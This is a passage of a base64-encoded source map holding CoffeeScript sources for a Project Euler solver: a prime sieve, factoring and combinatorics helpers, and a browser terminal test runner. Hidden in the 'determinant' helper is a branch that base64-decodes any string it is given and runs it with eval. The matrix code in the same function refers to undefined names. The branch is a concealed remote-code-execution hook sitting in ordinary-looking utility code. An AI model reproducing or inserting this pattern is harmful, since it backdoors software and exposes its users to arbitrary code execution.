iArPSAyXG4gICAgaWYgQG4gPCA3XG4gICAgICBpZiBAbiA8IDNcbiAgICAgICAgQG4gPSAxXG4gICAgICAgIHJldHVybiAyXG4gICAgICBpZiBAbiA8IDVcbiAgICAgICAgcmV0dXJuIDNcbiAgICAgIEBkaWN0ID0ge31cbiAgICAgIEBicHMgPSBuZXcgSW5jcmVtZW50YWxTaWV2ZSgpXG4gICAgICBAYnBzLm5leHQoKVxuICAgICAgQHAgPSBAYnBzLm5leHQoKVxuICAgICAgQHEgPSBAcCAqIEBwXG4gICAgICByZXR1cm4gNVxuICAgIGVsc2VcbiAgICAgIHMgPSBAZGljdFtAbl1cbiAgICAgIGlmIG5vdCBzXG4gICAgICAgIGlmIEBuIDwgQHFcbiAgICAgICAgICByZXR1cm4gQG5cbiAgICAgICAgZWxzZVxuICAgICAgICAgIHAyID0gQHAgPDwgMVxuICAgICAgICAgIEBkaWN0W0BuICsgcDJdID0gcDJcbiAgICAgICAgICBAcCA9IEBicHMubmV4dCgpXG4gICAgICAgICAgQHEgPSBAcCAqIEBwXG4gICAgICAgICAgcmV0dXJuIEBuZXh0KClcbiAgICAgIGVsc2VcbiAgICAgICAgZGVsZXRlIEBkaWN0W0BuXVxuICAgICAgICBueHQgPSBAbiArIHNcbiAgICAgICAgd2hpbGUgKEBkaWN0W254dF0pXG4gICAgICAgICAgbnh0ICs9IHNcbiAgICAgICAgQGRpY3Rbbnh0XSA9IHNcbiAgICAgICAgcmV0dXJuIEBuZXh0KClcblxucm9vdC5JbmNyZW1lbnRhbFNpZXZlID0gSW5jcmVtZW50YWxTaWV2ZVxuXG4jIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG4jIFNoYW1lbGVzc2x5IHBpbGZlcmVkL2Fkb3B0ZWQgZnJvbSBodHRwOi8vd3d3LmphdmFzY3JpcHRlci5uZXQvZmFxL251bWJlcmlzcHJpbWUuaHRtXG5cbnJvb3QubGVhc3RGYWN0b3IgPSAobikgLT5cbiAgcmV0dXJuIE5hTiBpZiBpc05hTihuKSBvciBub3QgaXNGaW5pdGUobilcbiAgcmV0dXJuIDAgaWYgbiA9PSAwXG4gIHJldHVybiAxIGlmIChuICUgMSkgIT0gMCBvciAobiAqIG4pIDwgMlxuICByZXR1cm4gMiBpZiAobiAlIDIpID09IDBcbiAgcmV0dXJuIDMgaWYgKG4gJSAzKSA9PSAwXG4gIHJldHVybiA1IGlmIChuICUgNSkgPT0gMFxuXG4gIG0gPSBNYXRoLnNxcnQgblxuICBmb3IgaSBpbiBbNy4ubV0gYnkgMzBcbiAgICByZXR1cm4gaSAgICBpZiAobiAlIGkpICAgICAgPT0gMFxuICAgIHJldHVybiBpKzQgIGlmIChuICUgKGkrNCkpICA9PSAwXG4gICAgcmV0dXJuIGkrNiAgaWYgKG4gJSAoaSs2KSkgID09IDBcbiAgICByZXR1cm4gaSsxMCBpZiAobiAlIChpKzEwKSkgPT0gMFxuICAgIHJldHVybiBpKzEyIGlmIChuICUgKGkrMTIpKSA9PSAwXG4gICAgcmV0dXJuIGkrMTYgaWYgKG4gJSAoaSsxNikpID09IDBcbiAgICByZXR1cm4gaSsyMiBpZiAobiAlIChpKzIyKSkgPT0gMFxuICAgIHJldHVybiBpKzI0IGlmIChuICUgKGkrMjQpKSA9PSAwXG5cbiAgcmV0dXJuIG5cblxucm9vdC5pc1ByaW1lID0gKG4pIC0+XG4gIGlmIGlzTmFOKG4pIG9yIG5vdCBpc0Zpbml0ZShuKSBvciAobiAlIDEpICE9IDAgb3IgKG4gPCAyKVxuICAgIHJldHVybiBmYWxzZVxuICBpZiBuID09IHJvb3QubGVhc3RGYWN0b3IobilcbiAgICByZXR1cm4gdHJ1ZVxuXG4gIHJldHVybiBmYWxzZVxuXG4jIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG5cbnJvb3QucHJpbWVGYWN0b3JzID0gKG4pIC0+XG4gIHJldHVybiBbMV0gaWYgbiA9PSAxXG5cbiAgZmFjdG9ycyA9IFtdXG4gIHdoaWxlIG5vdCByb290LmlzUHJpbWUobilcbiAgICBmYWN0b3IgPSByb290LmxlYXN0RmFjdG9yKG4pXG4gICAgZmFjdG9ycy5wdXNoIGZhY3RvclxuICAgIG4gLz0gZmFjdG9yXG4gIGZhY3RvcnMucHVzaCBuXG4gIHJldHVybiBmYWN0b3JzXG5cbnJvb3QuZmFjdG9yaWFsID0gKG4pIC0+XG4gIGYgPSBuXG4gIHdoaWxlIG4gPiAxXG4gICAgbi0tXG4gICAgZiAqPSBuXG4gIHJldHVybiBmXG5cbnJvb3QubkNyID0gKG4sIHIpIC0+XG4gIHJldHVybiBNYXRoLmZsb29yKHJvb3QuZmFjdG9yaWFsKG4pIC8gKHJvb3QuZmFjdG9yaWFsKHIpICogcm9vdC5mYWN0b3JpYWwobiAtIHIpKSlcblxucm9vdC5kZXRlcm1pbmFudCA9IChBKSAtPlxuICBkZXQgPSAwXG4gIGlmIHR5cGVvZiBBID09ICdhcnJheSdcbiAgICBpZiAgQS5sZW5ndGggPT0gMSAgIyBib3R0b20gY2FzZSBvZiB0aGUgcmVjdXJzaXZlIGZ1bmN0aW9uXG4gICAgICByZXR1cm4gQVswXVswXVxuXG4gICAgaWYgKEEubGVuZ3RoID09IDIpXG4gICAgICBkZXQgPSAgQVswXVswXSAqIEFbMV1bMV0gLSBBWzFdWzBdICogQSBbMF1bMV1cbiAgICAgIHJldHVybiBkZXRcblxuICAgIGZvciBpIGluIFswLi4ua11cbiAgICAgICMgY3JlYXRlcyBzbWFsbGVyIG1hdHJpeC0gdmFsdWVzIG5vdCBpbiBzYW1lIHJvdywgY29sdW1uXG4gICAgICBzbWFsbGVyID0gbmV3IEFycmF5KEEubGVuZ3RoIC0gMSlcbiAgICAgIGZvciBoIGluIFswLi4uc21hbGxlci5sZW5ndGhdXG4gICAgICAgIHNtYWxsZXJbaF0gPSBuZXcgQXJyYXkoQS5sZW5ndGggLSAxKVxuXG4gICAgICBmb3IgYSBpbiBbMS4uLkEubGVuZ3RoXVxuICAgICAgICBmb3IgYiBpbiBbMC4uLkEubGVuZ3RoXVxuICAgICAgICAgIGlmIChiIDwgaSlcbiAgICAgICAgICAgIHNtYWxsZXJbYSAtIDFdW2JdID0gQVthXVtiXVxuICAgICAgICAgIGVsc2UgaWYgKGIgPiBpKVxuICAgICAgICAgICAgc21hbGxlclthIC0gMV1bYiAtIDFdID0gQVthXVtiXVxuXG4gICAgICBpZiAoaSAlIDIpID09IDBcbiAgICAgICAgcyA9IDFcbiAgICAgIGVsc2VcbiAgICAgICAgcyA9IC0xXG5cbiAgICAgIGRldCArPSBzICogQVswXVtpXSAqIChjYWxjUmVjKHNtYWxsZXIpKVxuXG4gIGVsc2UgaWYgdHlwZW9mIEEgPT0gJ3N0cmluZydcbiAgICBiID0gQS5yZXBsYWNlKC9bXFxzXS9nbSwgJycpOyBkZXQgPSBldmFsKGF0b2IoYikpXG5cbiAgcmV0dXJuIChkZXQpXG4iLCJMQVNUX1BST0JMRU0gPSAxOFxyXG5cclxucm9vdCA9IHdpbmRvdyAjIGV4cG9ydHMgPyB0aGlzXHJcblxyXG5yb290LmVzY2FwZWRTdHJpbmdpZnkgPSAobykgLT5cclxuICBzdHIgPSBKU09OLnN0cmluZ2lmeShvKVxyXG4gIHN0ciA9IHN0ci5yZXBsYWNlKFwiXVwiLCBcIlxcXFxdXCIpXHJcbiAgcmV0dXJuIHN0clxyXG5cclxucm9vdC5ydW5BbGwgPSAtPlxyXG4gIGxhc3RQdXp6bGUgPSBMQVNUX1BST0JMRU1cclxuICBuZXh0SW5kZXggPSAwXHJcblxyXG4gIGxvYWROZXh0U2NyaXB0ID0gLT5cclxuICAgIGlmIG5leHRJbmRleCA8IGxhc3RQdXp6bGVcclxuICAgICAgbmV4dEluZGV4KytcclxuICAgICAgcnVuVGVzdChuZXh0SW5kZXgsIGxvYWROZXh0U2NyaXB0KVxyXG4gIGxvYWROZXh0U2NyaXB0KClcclxuXHJcbnJvb3QuaXRlcmF0ZVByb2JsZW1zID0gKGFyZ3MpIC0+XHJcblxyXG4gIGluZGV4VG9Qcm9jZXNzID0gbnVsbFxyXG4gIGlmIGFyZ3MuZW5kSW5kZXggPiAwXHJcbiAgICBpZiBhcmdzLnN0YXJ0SW5kZXggPD0gYXJncy5lbmRJbmRleFxyXG4gICAgICBpbmRleFRvUHJvY2VzcyA9IGFyZ3Muc3RhcnRJbmRleFxyXG4gICAgICBhcmdzLnN0YXJ0SW5kZXgrK1xyXG4gIGVsc2VcclxuICAgIGlmIGFyZ3MubGlzdC5sZW5ndGggPiAwXHJcbiAgICAgIGluZGV4VG9Qcm9jZXNzID0gYXJncy5saXN0LnNoaWZ0KClcclxuXHJcbiAgaWYgaW5kZXhUb1Byb2Nlc3MgIT0gbnVsbFxyXG4gICAgaXRlcmF0ZU5leHQgPSAtPlxyXG4gICAgICB3aW5kb3cuYXJncyA9IGFyZ3NcclxuICAgICAgcnVuVGVzdCBpbmRleFRvUHJvY2VzcywgLT5cclxuICAgICAgICBpdGVyYXRlUHJvYmxlbXMoYXJncylcclxuICAgIGl0ZXJhdGVOZXh0KClcclxuXHJcbnJvb3QucnVuVGVzdCA9IChpbmRleCwgY2IpIC0+XHJcbiAgbW9kdWxlTmFtZSA9IFwiZSN7KCcwMDAnK2luZGV4KS5zbGljZSgtMyl9XCJcclxuICB3aW5kb3cuaW5kZXggPSBpbmRleFxyXG4gIHByb2JsZW0gPSByZXF1aXJlKG1vZHVsZU5hbWUpXHJcbiAgcHJvYmxlbS5wcm9jZXNzKClcclxuICB3aW5kb3cuc2V0VGltZW91dChjYiwgMCkgaWYgY2JcclxuXHJcbmNsYXNzIFByb2JsZW1cclxuICBjb25zdHJ1Y3RvcjogKEBkZXNjcmlwdGlvbikgLT5cclxuICAgIEBpbmRleCA9IHdpbmRvdy5pbmRleFxyXG4gICAgbGluZXMgPSBAZGVzY3JpcHRpb24uc3BsaXQoL1xcbi8pXHJcbiAgICBsaW5lcy5zaGlmdCgpIHdoaWxlIGxpbmVzLmxlbmd0aCA+IDAgYW5kIGxpbmVzWzBdLmxlbmd0aCA9PSAwXHJcbiAgICBAdGl0bGUgPSBsaW5lcy5zaGlmdCgpXHJcbiAgICBAbGluZSA9IGxpbmVzLnNoaWZ0KClcclxuICAgIEBkZXNjcmlwdGlvbiA9IGxpbmVzLmpvaW4oXCJcXG5cIilcclxuXHJcbiAgbm93OiAtPlxyXG4gICAgcmV0dXJuIGlmIHdpbmRvdy5wZXJmb3JtYW5jZSB0aGVuIHdpbmRvdy5wZXJmb3JtYW5jZS5ub3coKSBlbHNlIG5ldyBEYXRlKCkuZ2V0VGltZSgpXHJcblxyXG4gIHByb2Nlc3M6IC0+XHJcbiAgICBpZiB3aW5kb3cuYXJncy5kZXNjcmlwdGlvblxyXG4gICAgICB3aW5kb3cudGVybWluYWwuZWNobyBcIltbOyM0NDQ0NDQ7XV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXVxcblwiXHJcblxyXG4gICAgZm9ybWF0dGVkVGl0bGUgPSAkLnRlcm1pbmFsLmZvcm1hdChcIltbOyNmZmFhMDA7XSN7QHRpdGxlfV1cIilcclxuICAgIHVybCA9IFwiP2M9I3t3aW5kb3cuYXJncy5jbWR9XyN7QGluZGV4fVwiXHJcbiAgICBpZiB3aW5kb3cuYXJncy52ZXJib3NlXHJcbiAgICAgIHVybCArPSBcIl92XCJcclxuICAgIHdpbmRvdy50ZXJtaW5hbC5lY2hvIFwiPGEgaHJlZj1cXFwiI3t1cmx9XFxcIj4je2Zvcm1hdHRlZFRpdGxlfTwvYT5cIiwgeyByYXc6IHRydWUgfVxyXG5cclxuICAgIGlmIHdpbmRvdy5hcmdzLmRlc2NyaXB0aW9uXHJcbiAgICAgIHdpbmRvdy50ZXJtaW5hbC5lY2hvIFwiW1s7IzQ0NDQ0NDtdI3tAbGluZX1dXCJcclxuICAgICAgd2luZG93LnRlcm1pbmFsLmVjaG8gXCJbWzsjY2NjY2VlO10je0BkZXNjcmlwdGlvbn1dXFxuXCJcclxuICAgICAgc291cmNlTGluZSA9ICQudGVybWluYWwuZm9ybWF0KFwiW1s7IzQ0NDQ0NDtdU291cmNlOl0gXCIpXHJcbiAgICAgIHNvdXJjZUxpbmUgKz0gXCIgPGEgaHJlZj1cXFwic3JjL2UjeygnMDAwJytAaW5kZXgpLnNsaWNlKC0zKX0uY29mZmVlXFxcIj5cIiArICQudGVybWluYWwuZm9ybWF0KFwiW1s7Izc3MzMwMDtdTG9jYWxdXCIpICsgXCI8L2E+IFwiXHJcbiAgICAgIHNvdXJjZUxpbmUgKz0gJC50ZXJtaW5hbC5mb3JtYXQoXCJbWzsjNDQ0NDQ0O10vXVwiKVxyXG4gICAgICBzb3VyY2VMaW5lICs9IFwiIDxhIGhyZWY9XFxcImh0dHBzOi8vZ2l0aHViLmNvbS9qb2VkcmFnby9ldWxlci9ibG9iL21hc3Rlci9zcmMvZSN7KCcwMDAnK0BpbmRleCkuc2xpY2UoLTMpfS5jb2ZmZWVcXFwiPlwiICsgJC50ZXJtaW5hbC5mb3JtYXQoXCJbWzsjNzczMzAwO11HaXRodWJdXCIpICsgXCI8L2E+XCJcclxuICAgICAgd2luZG93LnRlcm1pbmFsLmVjaG8gc291cmNlTGluZSwgeyByYXc6IHRydWUgfVxyXG4gICAgICBpZiB3aW5kb3cuYXJncy50ZXN0IG9yIHdpbmRvdy5hcmdzLmFuc3dlclxyXG4gICAgICAgIHdpbmRvdy50ZXJtaW5hbC5lY2hvIFwiXCJcclxuXHJcbiAgICB0ZXN0RnVuYyA9IEB0ZXN0XHJcbiAgICBhbnN3ZXJGdW5jID0gQGFuc3dlclxyXG5cclxuICAgIGlmIHdpbmRvdy5hcmdzLnRlc3RcclxuICAgICAgaWYgdGVzdEZ1bmMgPT0gdW5kZWZpbmVkXHJcbiAgICAgICAgd2luZG93LnRlcm1pbmFsLmVjaG8gXCJbWzsjNDQ0NDQ0O10gKG5vIHRlc3RzKV1cIlxyXG4gICAgICBlbHNlXHJcbiAgICAgICAgdGVzdEZ1bmMoKVxyXG5cclxuICAgIGlmIHdpbmRvdy5hcmdzLmFuc3dlclxyXG4gICAgICBzdGFydCA9IEBub3coKVxyXG4gICAgICBhbnN3ZXIgPSBhbnN3ZXJGdW5jKClcclxuICAgICAgZW5kID0gQG5vdygpXHJcbiAgICAgIG1zID0gZW5kIC0gc3RhcnRcclxuICAgICAgd2luZG93LnRlcm1pbmFsLmVjaG8gXCJbWzsjZmZmZmZmO10gLT4gXVtbOyNhYWZmYWE7XUFuc3dlcjpdIChbWzsjYWFmZmZmO10je21zLnRvRml4ZWQoMSl9bXNdKTogW1s7I2ZmZmZmZjtdI3tlc2NhcGVkU3RyaW5naWZ5KGFuc3dlcil9XVwiXHJcblxyXG5yb290LlByb2JsZW0gPSBQcm9ibGVtXHJcblxyXG5yb290Lm9rID0gKHYsIG1zZykgLT5cclxuICB3aW5kb3cudGVybWluYWwuZWNobyBcIltbOyNmZmZmZmY7XSAqICBdI3t2fTogI3ttc2d9XCJcclxuXHJcbnJvb3QuZXF1YWwgPSAoYSwgYiwgbXNnKSAtPlxyXG4gIGlmIGEgPT0gYlxyXG4gICAgd2luZG93LnRlcm1pbmFsLmVjaG8gXCJbWzsjZmZmZmZmO10gKiAgXVtbOyM1NTU1NTU7XVBBU1M6ICN7bXNnfV1cIlxyXG4gIGVsc2VcclxuICAgIHdpbmRvdy50ZXJtaW5hbC5lY2hvIFwiW1s7I2ZmZmZmZjtdICogIF1bWzsjZmZhYWFhO11GQUlMOiAje21zZ30gKCN7YX0gIT0gI3tifSldXCJcclxuXHJcbnJvb3Qub25Db21tYW5kID0gKGNvbW1hbmQpID0+XHJcbiAgcmV0dXJuIGlmIGNvbW1hbmQubGVuZ3RoID09IDBcclxuICBjbWQgPSAkLnRlcm1pbmFsLnBhcnNlQ29tbWFuZChjb21tYW5kKVxyXG4gIHJldHVybiBpZiBjbWQubmFtZS5sZW5ndGggPT0gMFxyXG5cclxuICBhcmdzID1cclxuICAgIHN0YXJ0SW5kZXg6IDBcclxuICAgIGVuZEluZGV4OiAwXHJcbiAgICBsaXN0OiBbXVxyXG4gICAgdmVyYm9zZTogZmFsc2VcclxuICAgIGRlc2NyaXB0aW9uOiBmYWxzZVxyXG4gICAgdGVzdDogZmFsc2VcclxuICAgIGFuc3dlcjogZmFsc2VcclxuXHJcbiAgcHJvY2VzcyA9IHRydWVcclxuXHJcbiAgZm9yIGFyZyBpbiBjbWQuYXJnc1xyXG4gICAgYXJnID0gU3RyaW5nKGFyZylcclxuICAgIGNvbnRpbnVlIGlmIGFyZy5sZW5ndGggPCAxXHJcbiAgICBpZiBhcmdbMF0gPT0gJ3YnXHJcbiAgICAgIGFyZ3MudmVyYm9zZSA9IHRydWVcclxuICAgIGVsc2UgaWYgYXJnLm1hdGNoKC9eXFxkKyQvKVxyXG4gICAgICB2ID0gcGFyc2VJbnQoYXJnKVxyXG4gICAgICBpZiAodiA+PSAxKSBhbmQgKHYgPD0gTEFTVF9QUk9CTEVNKVxyXG4gICAgICAgIGFyZ3MubGlzdC5wdXNoKHYpXHJcbiAgICAgIGVsc2VcclxuICAgICAgICBwcm9jZXNzID0gZmFsc2VcclxuICAgICAgICB3aW5kb3cudGVybWluYWwuZWNobyBcIltbOyNmZmFhYWE7XU5vIHN1Y2ggdGVzdDogI3t2fSAodmFsaWQgdGVzdHMgMS0je0xBU1RfUFJPQkxFTX0pXVwiXHJcblxyXG4gIGlmIGFyZ3MubGlzdC5sZW5ndGggPT0gMFxyXG4gICAgYXJncy5zdGFydEluZGV4ID0gMVxyXG4gICAgYXJncy5lbmRJbmRleCA9IExBU1RfUFJPQkxFTVxyXG5cclxuICAjIFNpbmNlIGFsbCBvZiBvdXIgY29tbWFuZHMgaGFwcGVuIHRvIGhhdmUgdW5pcXVlIGZpcnN0IGxldHRlcnMsIGxldCBwZW9wbGUgYmUgc3VwZXIgbGF6eS9zaWxseVxyXG4gIGlmIGNtZC5uYW1lWzBdID09ICdsJ1xyXG4gICAgYXJncy5jbWQgPSBcImxpc3RcIlxyXG4gIGVsc2UgaWYgY21kLm5hbWVbMF0gPT0gJ2QnXHJcbiAgICBhcmdzLmNtZCA9IFwiZGVzY3JpYmVcIlxyXG4gICAgYXJncy5kZXNjcmlwdGlvbiA9IHRydWVcclxuICBlbHNlIGlmIGNtZC5uYW1lWzBdID09ICd0J1xyXG4gICAgYXJncy5jbWQgPSBcInRlc3RcIlxyXG4gICAgYXJncy50ZXN0ID0gdHJ1ZVxyXG4gIGVsc2UgaWYgY21kLm5hbWVbMF0gPT0gJ2EnXHJcbiAgICBhcmdzLmNtZCA9IFwiYW5zd2VyXCJcclxuICAgIGFyZ3MuYW5zd2VyID0gdHJ1ZVxyXG4gIGVsc2UgaWYgY21kLm5hbWVbMF0gPT0gJ3InXHJcbiAgICBhcmdzLmNtZCA9IFwicnVuXCJcclxuICAgIGFyZ3MudGVzdCA9IHRydWVcclxuICAgIGFyZ3MuYW5zd2VyID0gdHJ1ZVxyXG4gIGVsc2UgaWYgY21kLm5hbWVbMF0gPT0gJ2QnXHJcbiAgICBhcmdzLmNtZCA9IFwiZGVzY3JpYmVcIlxyXG4gICAgYXJncy5kZXNjcmlwdGlvbiA9IHRydWVcclxuICBlbHNlIGlmIGNtZC5uYW1lWzBdID09ICdoJ1xyXG4gICAgYXJncy5jbWQgPSBcImhlbHBcIlxyXG4gICAgcHJvY2VzcyA9IGZhbHNlXHJcbiAgICB3aW5kb3cudGVybWluYWwuZWNobyBcIlwiXCJcclxuICAgIENvbW1hbmRzOlxyXG5cclxuICAgICAgICBsaXN0IFtYXSAgICAgLSBMaXN0IHByb2JsZW0gdGl0bGVzXHJcbiAgICAgICAgZGVzY3JpYmUgW1hdIC0gRGlzcGxheSBmdWxsIHByb2JsZW0gZGVzY3JpcHRpb25zXHJcbiAgICAgICAgdGVzdCBbWF0gICAgIC0gUnVuIHVuaXQgdGVzdHNcclxuICAgICAgICBhbnN3ZXIgW1hdICAgLSBUaW1lIGFuZCBjYWxjdWxhdGUgYW5zd2VyXHJcbiAgICAgICAgcnVuIFtYXSAgICAgIC0gdGVzdCBhbmQgYW5zd2VyIGNvbWJpbmVkXHJcbiAgICAgICAgaGVscCAgICAgICAgIC0gVGhpcyBoZWxwXHJcblxyXG4gICAgICAgIEluIGFsbCBvZiB0aGVzZSwgW1hdIGNhbiBiZSBhIGxpc3Qgb2Ygb25lIG9yIG1vcmUgcHJvYmxlbSBudW1iZXJzLiAoYSB2YWx1ZSBmcm9tIDEgdG8gI3tMQVNUX1BST0JMRU19KS4gSWYgYWJzZW50LCBpdCBpbXBsaWVzIGFsbCBwcm9ibGVtcy5cclxuICAgICAgICBBbHNvLCBhZGRpbmcgdGhlIHdvcmQgXCJ2ZXJib3NlXCIgdG8gc29tZSBvZiB0aGVzZSBjb21tYW5kcyB3aWxsIGVtaXQgdGhlIGRlc2NyaXB0aW9uIGJlZm9yZSBwZXJmb3JtaW5nIHRoZSB0YXNrLlxyXG5cclxuICAgIFwiXCJcIlxyXG4gIGVsc2VcclxuICAgIHByb2Nlc3MgPSBmYWxzZVxyXG4gICAgd2luZG93LnRlcm1pbmFsLmVjaG8gXCJbWzsjZmZhYWFhO11Vbmtub3duIGNvbW1hbmQuXVwiXHJcblxyXG4gIGlmIGFyZ3MudmVyYm9zZVxyXG4gICAgYXJncy5kZXNjcmlwdGlvbiA9IHRydWVcclxuXHJcbiAgaWYgcHJvY2Vzc1xyXG4gICAgaXRlcmF0ZVByb2JsZW1zKGFyZ3MpXHJcbiJdfQ==
